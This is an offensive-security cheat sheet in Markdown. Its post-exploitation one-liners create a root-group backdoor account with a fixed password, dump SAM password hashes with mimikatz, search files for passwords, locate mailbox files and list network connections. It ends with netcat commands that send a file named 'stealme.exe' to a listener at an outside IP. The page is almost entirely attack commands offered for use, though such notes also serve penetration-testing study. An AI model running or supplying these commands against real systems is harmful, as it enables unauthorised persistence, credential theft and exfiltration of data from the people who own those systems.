<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md">Top of Page</a> |
  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
</p>

# Cheatsheets - Effect
* [One-liner: useradd and chpasswd](#one-liner-useradd-and-chpasswd)
* [Dump Passwords](#dump-passwords)
* [Find Password Files](#find-password-files)
* [Find Emailboxes](#find-emailboxes)
* [Get Network Connections](#get-network-connections)
* [Exfil via Netcat](#exfil-via-netcat)

## One-liner: useradd and chpasswd
```bash
useradd victor -g root -s /bin/bash && echo victor:1337 | chpasswd
```

## Dump Passwords
```bash
mimikatz.exe "lsadump::sam"
```

## Find Password Files
```bash
findstr /si password *.xml *.ini *.txt (Find passwords)
```

## Find Emailboxes
```bash
dir *.dbx /s 
```

## Get Network Connections
```bash
# all connections, no name resolution, and print owning PID 
netstat -ano 

# print filepath of each network-connected binary
(Get-NetTcpConnection).OwningProcess | ForEach-Object { Get-Process -Id $_ | Select-Object -ExpandProperty Path } | Sort-Object | Get-Unique
```

## Exfil via Netcat
```bash
nc -nvlp 5050 > stolen.exe
nc.exe -w3 10.11.12.13 5050 < stealme.exe
```

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md">Top of Page</a> |
  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
